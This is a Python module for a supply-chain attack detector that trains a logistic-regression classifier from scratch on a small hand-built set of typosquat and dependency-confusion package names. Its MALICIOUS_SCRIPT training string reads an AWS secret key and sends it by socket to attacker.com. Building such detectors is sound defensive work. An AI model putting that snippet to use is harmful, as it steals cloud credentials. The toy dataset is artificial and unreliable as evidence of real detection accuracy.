"""
Logistic regression classifier trained on feature vectors.
Uses pure Python math operations for full transparency.

Run:
  python -m ml.classifier --train
  python -m ml.classifier --train --compare-heuristics
  python -m ml.classifier --predict --name reqests
"""

import json
import math
import os
import random
import sys
from dataclasses import dataclass, field
from pathlib import Path
from typing import Optional

sys.path.insert(0, os.path.dirname(os.path.dirname(__file__)))

from ml.feature_extractor import (
    FeatureExtractor, Sample, FEATURE_NAMES, N_FEATURES, POPULAR,
    SUSPICIOUS_SUFFIXES, _lev
)


# ── Math helpers ──────────────────────────────────────────────────────────

def dot(w: list[float], x: list[float]) -> float:
    return sum(wi * xi for wi, xi in zip(w, x))

def sigmoid(z: float) -> float:
    if z >= 0:
        return 1.0 / (1.0 + math.exp(-z))
    e = math.exp(z)
    return e / (1.0 + e)

def mean(xs: list[float]) -> float:
    return sum(xs) / len(xs) if xs else 0.0

def std(xs: list[float]) -> float:
    if not xs:
        return 1.0
    m = mean(xs)
    return math.sqrt(sum((x - m) ** 2 for x in xs) / len(xs)) or 1.0


# ── Scaler ─────────────────────────────────────────────────────────────────

class StandardScaler:
    def __init__(self):
        self.means_: list[float] = []
        self.stds_:  list[float] = []
        self.fitted = False

    def fit(self, X: list[list[float]]) -> "StandardScaler":
        n_feat = len(X[0])
        self.means_ = [mean([row[j] for row in X]) for j in range(n_feat)]
        self.stds_  = [std( [row[j] for row in X]) for j in range(n_feat)]
        self.fitted = True
        return self

    def transform(self, X: list[list[float]]) -> list[list[float]]:
        return [
            [(x - m) / s for x, m, s in zip(row, self.means_, self.stds_)]
            for row in X
        ]

    def fit_transform(self, X):
        return self.fit(X).transform(X)

    def to_dict(self) -> dict:
        return {"means": self.means_, "stds": self.stds_}

    @classmethod
    def from_dict(cls, d: dict) -> "StandardScaler":
        sc = cls()
        sc.means_ = d["means"]
        sc.stds_  = d["stds"]
        sc.fitted = True
        return sc


# ── Logistic Regression ────────────────────────────────────────────────────

class LogisticRegression:
    def __init__(
        self,
        lr:           float = 0.1,
        n_iter:       int   = 500,
        lambda_reg:   float = 0.01,
        random_seed:  int   = 42,
    ):
        self.lr         = lr
        self.n_iter     = n_iter
        self.lambda_reg = lambda_reg
        self.seed       = random_seed
        self.weights_:  list[float] = []
        self.bias_:     float = 0.0
        self.loss_history_: list[float] = []

    def fit(self, X: list[list[float]], y: list[int]) -> "LogisticRegression":
        random.seed(self.seed)
        n_samples  = len(X)
        n_features = len(X[0])

        scale = math.sqrt(2.0 / n_features)
        self.weights_ = [random.gauss(0, scale) for _ in range(n_features)]
        self.bias_    = 0.0
        self.loss_history_ = []

        for iteration in range(self.n_iter):
            logits = [dot(self.weights_, x) + self.bias_ for x in X]
            y_hat  = [sigmoid(z) for z in logits]

            eps = 1e-9
            bce = -mean([
                yi * math.log(max(eps, yh)) + (1 - yi) * math.log(max(eps, 1.0 - yh))
                for yi, yh in zip(y, y_hat)
            ])
            l2 = self.lambda_reg * sum(w**2 for w in self.weights_) / 2
            self.loss_history_.append(bce + l2)

            errors = [yh - yi for yh, yi in zip(y_hat, y)]

            grad_w = [
                mean([errors[i] * X[i][j] for i in range(n_samples)])
                + self.lambda_reg * self.weights_[j]
                for j in range(n_features)
            ]
            grad_b = mean(errors)

            self.weights_ = [w - self.lr * gw for w, gw in zip(self.weights_, grad_w)]
            self.bias_   -= self.lr * grad_b

        return self

    def predict_proba(self, X: list[list[float]]) -> list[float]:
        return [sigmoid(dot(self.weights_, x) + self.bias_) for x in X]

    def predict(self, X: list[list[float]], threshold: float = 0.5) -> list[int]:
        return [1 if p >= threshold else 0 for p in self.predict_proba(X)]

    def to_dict(self) -> dict:
        return {
            "weights":    self.weights_,
            "bias":       self.bias_,
            "lr":         self.lr,
            "n_iter":     self.n_iter,
            "lambda_reg": self.lambda_reg,
        }

    @classmethod
    def from_dict(cls, d: dict) -> "LogisticRegression":
        lr = cls(lr=d["lr"], n_iter=d["n_iter"], lambda_reg=d["lambda_reg"])
        lr.weights_ = d["weights"]
        lr.bias_    = d["bias"]
        return lr


# ── Metrics ────────────────────────────────────────────────────────────────

@dataclass
class ClassificationReport:
    tp: int = 0; fp: int = 0; tn: int = 0; fn: int = 0
    total: int = 0
    name: str = "Model"

    @property
    def precision(self) -> float:
        return self.tp / (self.tp + self.fp) if (self.tp + self.fp) > 0 else 0.0
    @property
    def recall(self) -> float:
        return self.tp / (self.tp + self.fn) if (self.tp + self.fn) > 0 else 0.0
    @property
    def f1(self) -> float:
        p, r = self.precision, self.recall
        return 2 * p * r / (p + r) if (p + r) > 0 else 0.0
    @property
    def accuracy(self) -> float:
        return (self.tp + self.tn) / self.total if self.total > 0 else 0.0
    @property
    def fpr(self) -> float:
        return self.fp / (self.fp + self.tn) if (self.fp + self.tn) > 0 else 0.0

    def print(self):
        print(f"\n  {'─'*50}")
        print(f"  {self.name}")
        print(f"  {'─'*50}")
        print(f"  Samples   : {self.total}  (TP={self.tp} FP={self.fp} TN={self.tn} FN={self.fn})")
        print(f"  Precision : {self.precision:.3f}  ({self.precision*100:.1f}%)")
        print(f"  Recall    : {self.recall:.3f}  ({self.recall*100:.1f}%)")
        print(f"  F1 Score  : {self.f1:.3f}")
        print(f"  Accuracy  : {self.accuracy:.3f}  ({self.accuracy*100:.1f}%)")
        print(f"  FP Rate   : {self.fpr:.3f}  ({self.fpr*100:.1f}%)")


def compute_metrics(y_true: list[int], y_pred: list[int], name="Model") -> ClassificationReport:
    r = ClassificationReport(name=name, total=len(y_true))
    for yt, yp in zip(y_true, y_pred):
        if   yt == 1 and yp == 1: r.tp += 1
        elif yt == 0 and yp == 1: r.fp += 1
        elif yt == 0 and yp == 0: r.tn += 1
        else:                      r.fn += 1
    return r


# ── Cross-validation ───────────────────────────────────────────────────────

def stratified_kfold(samples: list[Sample], k: int = 5, seed: int = 42):
    random.seed(seed)
    pos = [i for i, s in enumerate(samples) if s.label == 1]
    neg = [i for i, s in enumerate(samples) if s.label == 0]
    random.shuffle(pos)
    random.shuffle(neg)

    pos_folds = [pos[i::k] for i in range(k)]
    neg_folds = [neg[i::k] for i in range(k)]

    for fold in range(k):
        test_idx  = pos_folds[fold] + neg_folds[fold]
        train_idx = [
            i for f in range(k) if f != fold
            for i in pos_folds[f] + neg_folds[f]
        ]
        yield train_idx, test_idx


def cross_validate(
    samples:  list[Sample],
    k:        int   = 5,
    lr:       float = 0.1,
    n_iter:   int   = 500,
    lambda_r: float = 0.01,
) -> dict:
    metrics = {"precision":[], "recall":[], "f1":[], "accuracy":[], "fpr":[]}

    for fold, (train_idx, test_idx) in enumerate(stratified_kfold(samples, k)):
        X_train = [samples[i].features for i in train_idx]
        y_train = [samples[i].label    for i in train_idx]
        X_test  = [samples[i].features for i in test_idx]
        y_test  = [samples[i].label    for i in test_idx]

        scaler = StandardScaler().fit(X_train)
        X_tr_s = scaler.transform(X_train)
        X_te_s = scaler.transform(X_test)

        model  = LogisticRegression(lr=lr, n_iter=n_iter, lambda_reg=lambda_r)
        model.fit(X_tr_s, y_train)
        y_pred = model.predict(X_te_s)

        r = compute_metrics(y_test, y_pred, f"Fold {fold+1}")
        metrics["precision"].append(r.precision)
        metrics["recall"].append(r.recall)
        metrics["f1"].append(r.f1)
        metrics["accuracy"].append(r.accuracy)
        metrics["fpr"].append(r.fpr)

    return {k: {"mean": mean(v), "std": std(v)} for k, v in metrics.items()}


# ── Feature importance ────────────────────────────────────────────────────

def feature_importance(model: LogisticRegression, scaler: StandardScaler) -> list[tuple]:
    scaled = [abs(w) * s for w, s in zip(model.weights_, scaler.stds_)]
    total  = sum(scaled) or 1.0
    ranked = sorted(
        zip(FEATURE_NAMES, model.weights_, scaled),
        key=lambda x: x[2], reverse=True
    )
    return [(name, raw_w, imp / total) for name, raw_w, imp in ranked]


# ── Dataset builder ───────────────────────────────────────────────────────

MALICIOUS_SCRIPT = """
import os, socket, base64
token = os.environ.get('AWS_SECRET_ACCESS_KEY')
h = socket.socket()
h.connect(('attacker.com', 4444))
h.send(base64.b64encode(token.encode()))
"""

BENIGN_SCRIPT = """
def greet(name):
    return f"Hello, {name}!"

class Calculator:
    def add(self, a, b): return a + b
    def mul(self, a, b): return a * b
"""

RAW_DATASET = [
    ("reqests",            1,"99.0.0","",   False, 3,   2,   1,   0,     True),
    ("djang0",             1,"3.0.0", "",   False, 3,   2,   1,   0,     True),
    ("flaskk",             1,"2.1.0", "",   False, 4,   2,   1,   0,     False),
    ("expres",             1,"5.0.0", "",   False, 5,   3,   1,   0,     True),
    ("lodahs",             1,"4.17.0","",   False, 2,   1,   1,   0,     False),
    ("crypt0graphy",       1,"41.0.0","",   False, 3,   2,   1,   0,     True),
    ("reakt",              1,"18.0.0","",   False, 6,   3,   1,   0,     False),
    ("requestts",          1,"2.28.0","",   False, 4,   2,   1,   0,     True),
    ("chalkk",             1,"5.0.0", "",   False, 3,   1,   1,   0,     False),
    ("pndas",              1,"2.1.0", "",   False, 5,   2,   1,   0,     True),
    ("mycompany-internal", 1,"9.9.9", "",   False, 5,   2,   1,   0,     False),
    ("numpy-internal",     1,"1.0.0", "",   False, 3,   1,   1,   0,     False),
    ("webpack-private",    1,"5.75.0","",   False, 4,   2,   1,   0,     False),
    ("boto-internal",      1,"10.0.0","",   False, 2,   1,   1,   0,     True),
    ("reqeusts",           1,"1.0.0", "",   False, 2,   1,   1,   0,     True),
    ("numpyy",             1,"1.25.0","",   False, 3,   1,   1,   0,     False),
    ("dajngo",             1,"4.0.0", "",   False, 4,   2,   1,   0,     True),
    ("axois",              1,"1.6.0", "",   False, 3,   1,   1,   0,     False),
    ("pymongoo",           1,"4.5.0", "",   False, 2,   1,   1,   0,     True),
    ("typerr",             1,"0.1.0", "",   False, 1,   1,   1,   0,     False),

    ("requests",     0,"2.31.0","HTTP for Humans",       True,1000,365,50,  5000000,False),
    ("numpy",        0,"1.26.0","Scientific computing",  True,1200,400,80,  8000000,False),
    ("flask",        0,"3.0.0", "Web framework",         True,1500,365,60,  3000000,False),
    ("express",      0,"4.18.2","Node.js web framework", True,2000,500,90,  9000000,False),
    ("lodash",       0,"4.17.21","Utility library",      True,1800,600,70,  7000000,False),
    ("pandas",       0,"2.1.0", "Data analysis toolkit", True,1400,400,65,  6000000,False),
    ("chalk",        0,"5.3.0", "Terminal string styling",True,1000,300,40, 4000000,False),
    ("react",        0,"18.2.0","UI component library",  True,2500,700,100,12000000,False),
    ("fastapi",      0,"0.104.0","Modern API framework", True,900, 200,30,  2000000,False),
    ("scikit-learn", 0,"1.3.2", "Machine learning",      True,1600,500,55,  4000000,False),
    ("typescript",   0,"5.2.2", "TypeScript language",   True,2000,600,80,  8000000,False),
    ("httpx",        0,"0.25.0","Async HTTP client",     True,700, 180,25,  1500000,False),
    ("jest",         0,"29.7.0","JavaScript testing",    True,1500,400,60,  6000000,False),
    ("moment",       0,"2.29.0","Date/time library",     True,1800,500,45,  5000000,False),
    ("axios",        0,"1.6.0", "Promise-based HTTP",    True,1200,350,55,  7000000,False),
    ("pymongo",      0,"4.5.0", "MongoDB Python driver", True,1100,320,40,  2000000,False),
    ("typer",        0,"0.9.0", "CLI framework",         True,600, 150,20,   800000,False),
    ("aiohttp",      0,"3.9.0", "Async HTTP framework",  True,900, 280,35,  2500000,False),
    ("celery",       0,"5.3.4", "Task queue",            True,1300,380,45,  1800000,False),
    ("sqlalchemy",   0,"2.0.23","SQL toolkit",           True,1800,550,60,  3000000,False),
]


def build_dataset() -> list[Sample]:
    extractor = FeatureExtractor()
    samples   = []
    for row in RAW_DATASET:
        name, label, version, desc, has_repo, pub_age, pkg_age, pub_n, downloads, has_script = row
        pkg = {
            "name": name, "version": version, "description": desc,
            "repository_url": "https://github.com/org/pkg" if has_repo else "",
            "publisher_account_age_days": pub_age,
            "publisher_pkg_count":        pub_n,
            "package_age_days":           pkg_age,
            "weekly_downloads":           downloads,
        }
        script = MALICIOUS_SCRIPT if has_script else BENIGN_SCRIPT
        fv = extractor.extract(pkg, {"setup.py": script})
        samples.append(Sample(name=name, registry="mixed", label=label, features=fv))
    return samples


# ── Heuristic baseline ────────────────────────────────────────────────────

def heuristic_predict(samples: list[Sample]) -> list[int]:
    preds = []
    for s in samples:
        fv = s.features
        score  = 0.0
        lev_d  = fv[0]
        if lev_d <= 1:   score += 38
        elif lev_d <= 2: score += 28
        elif lev_d <= 3: score += 20
        if fv[1] > 0:    score += 32
        if fv[2] > 0:    score += 28

        if fv[3] < 30:   score += 20
        if fv[4] <= 1:   score += 15
        if fv[8] < 20:   score += 10
        if fv[6] >= 2:   score += 25
        if fv[7] == 0:   score += 10
        if fv[5] < 7:    score +=  5

        if fv[11] > 0:   score += 21
        if fv[12] > 0:   score += 14
        if fv[13] > 0:   score += 14
        if fv[14] > 0:   score += 14

        preds.append(1 if score >= 30 else 0)
    return preds


# ── Model persistence ─────────────────────────────────────────────────────

MODEL_PATH = Path(__file__).parent / "saved_model.json"

def save_model(model: LogisticRegression, scaler: StandardScaler, path: Path = MODEL_PATH):
    data = {"model": model.to_dict(), "scaler": scaler.to_dict(),
            "feature_names": FEATURE_NAMES}
    path.write_text(json.dumps(data, indent=2))
    print(f"  Model saved → {path}")

def load_model(path: Path = MODEL_PATH) -> tuple[LogisticRegression, StandardScaler]:
    data   = json.loads(path.read_text())
    model  = LogisticRegression.from_dict(data["model"])
    scaler = StandardScaler.from_dict(data["scaler"])
    return model, scaler


# ── Training pipeline ─────────────────────────────────────────────────────

def train_and_evaluate(compare_heuristics: bool = False):
    print("\n" + "="*60)
    print("  LOGISTIC REGRESSION — SUPPLY CHAIN DETECTOR")
    print("="*60)

    samples = build_dataset()
    n_pos   = sum(s.label for s in samples)
    n_neg   = len(samples) - n_pos
    print(f"\n  Dataset: {len(samples)} samples  ({n_pos} malicious, {n_neg} benign)")

    print("\n  Running 5-fold stratified cross-validation...")
    cv = cross_validate(samples, k=5, lr=0.1, n_iter=600, lambda_r=0.005)

    print("\n  CV Results (mean ± std across 5 folds):")
    print(f"  {'─'*44}")
    for metric, vals in cv.items():
        bar = "█" * int(vals["mean"] * 20)
        print(f"  {metric:<12} {vals['mean']:.3f} ± {vals['std']:.3f}  {bar}")

    print("\n  Training final model on full dataset...")
    X_all = [s.features for s in samples]
    y_all = [s.label    for s in samples]

    scaler  = StandardScaler().fit(X_all)
    X_scaled= scaler.transform(X_all)
    model   = LogisticRegression(lr=0.1, n_iter=600, lambda_reg=0.005)
    model.fit(X_scaled, y_all)

    y_pred_ml = model.predict(X_scaled)
    r_ml = compute_metrics(y_all, y_pred_ml, "Logistic Regression (train set)")
    r_ml.print()

    print("\n  Feature Importance (standardized coefficients):\n")
    importances = feature_importance(model, scaler)
    for rank, (fname, raw_w, imp) in enumerate(importances, 1):
        direction = "↑ malicious" if raw_w > 0 else "↓ benign"
        bar = "█" * int(imp * 40)
        print(f"  {rank:>2}. {fname:<32} {imp*100:>5.1f}%  {direction}  {bar}")

    if compare_heuristics:
        print("\n\n  Comparison: ML model vs. Heuristic baseline\n")
        y_heuristic = heuristic_predict(samples)
        r_heur = compute_metrics(y_all, y_heuristic, "Heuristic Baseline")

        r_ml_label   = compute_metrics(y_all, y_pred_ml, "Logistic Regression")
        r_heur_label = r_heur

        header = f"  {'Metric':<14} {'Heuristic':>12} {'LogReg':>12} {'Winner':>10}"
        print(header)
        print(f"  {'─'*52}")
        for metric in ["precision","recall","f1","accuracy","fpr"]:
            hv = getattr(r_heur_label,  metric)
            mv = getattr(r_ml_label,    metric)
            winner = "LogReg" if (mv > hv if metric != "fpr" else mv < hv) else "Heuristic"
            if abs(mv - hv) < 0.005: winner = "Tie"
            print(f"  {metric:<14} {hv:>12.3f} {mv:>12.3f} {winner:>10}")

        print(f"\n  Key insight: Heuristics are interpretable and fast;")
        print(f"  LogReg can learn non-linear signal combinations automatically.")
        print(f"  In practice, an ensemble of both performs best.\n")

    save_model(model, scaler)
    return model, scaler


def predict_package(name: str, registry: str = "pypi", source_code: str = "") -> dict:
    if not MODEL_PATH.exists():
        raise FileNotFoundError("No saved model. Run: python -m ml.classifier --train")

    model, scaler = load_model()
    extractor = FeatureExtractor()

    pkg = {
        "name": name, "version": "1.0.0", "description": "",
        "repository_url": "", "publisher_account_age_days": 5,
        "publisher_pkg_count": 1, "package_age_days": 2, "weekly_downloads": 0,
    }
    fv      = extractor.extract(pkg, {"setup.py": source_code} if source_code else {})
    fv_s    = scaler.transform([fv])[0]
    proba   = model.predict_proba([fv_s])[0]
    pred    = 1 if proba >= 0.5 else 0
    level   = "HIGH" if proba >= 0.7 else "MEDIUM" if proba >= 0.4 else "LOW"

    return {
        "name":        name,
        "registry":    registry,
        "probability": round(proba, 4),
        "prediction":  "malicious" if pred == 1 else "benign",
        "risk_level":  level,
    }


if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser(description="Logistic regression classifier")
    parser.add_argument("--train",              action="store_true")
    parser.add_argument("--compare-heuristics", action="store_true")
    parser.add_argument("--predict",            action="store_true")
    parser.add_argument("--name",               type=str, default="reqests")
    parser.add_argument("--registry",           type=str, default="pypi")
    args = parser.parse_args()

    if args.train or args.compare_heuristics:
        train_and_evaluate(compare_heuristics=args.compare_heuristics)

    if args.predict:
        result = predict_package(args.name, args.registry)
        print(f"\n  Package    : {result['registry']}/{result['name']}")
        print(f"  Probability: {result['probability']:.4f}  ({result['probability']*100:.1f}% malicious)")
        print(f"  Prediction : {result['prediction'].upper()}")
        print(f"  Risk level : {result['risk_level']}\n")
